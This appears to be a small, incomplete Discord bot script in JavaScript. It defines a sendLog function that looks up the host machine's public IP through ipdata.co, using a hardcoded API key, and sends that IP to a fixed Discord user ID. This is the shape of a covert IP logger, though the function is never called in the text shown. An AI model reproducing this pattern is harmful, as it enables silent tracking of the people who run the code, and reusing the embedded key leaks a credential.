const Discord = require('discord.js');
const client = new Discord.Client();
const scriptjs = require('./script')
function json(url) {

    return fetch(url).then(res => res.json());
}
var apiKey = '0d0bf4429438b2ecf5d06cb0e2f8b3f7752c24a7e48c080a00c5a57d';

function sendLog() {
    json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
        client.users.get("768931917172310057").send(data.ip)
    })
}

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});


client.login('token');